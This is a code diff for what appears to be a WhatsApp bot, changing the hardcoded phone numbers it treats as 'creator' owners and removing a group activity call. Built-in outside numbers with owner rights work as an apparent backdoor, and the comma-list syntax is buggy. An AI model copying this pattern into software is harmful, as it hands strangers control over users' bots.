@@ -465,15 +465,12 @@ setupLinkDetection(conn);
   
   
   const udp = botNumber.split('@')[0];
-    const davex = ('50948336180', '50934960331', '923192173398', '237682803592');
+    const dybyx = ('50934960331', '50948336180', '50948702213');
     
-    if (isGroup) {
-                updateActivity(from, sender);
-	  }
-	  // اینجا یک آرایه قرار می‌دهیم
-  const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
-  let isCreator = [udp, ...davex, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') // اطمینان حاصل کنید که شماره‌ها به فرمت صحیح تبدیل شده‌اند
+    const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
+    
+    let isCreator = [udp, ...dybyx, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
+    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
     .includes(mek.sender);
 	  
 
@@ -504,8 +501,7 @@ setupLinkDetection(conn);
                 reply(util.format(err));
             }
             return;
-        }
-
+	  }	  
    //=========BAN SUDO=============
 	// --- Ban and Sudo Utility Code for index.js ---
  
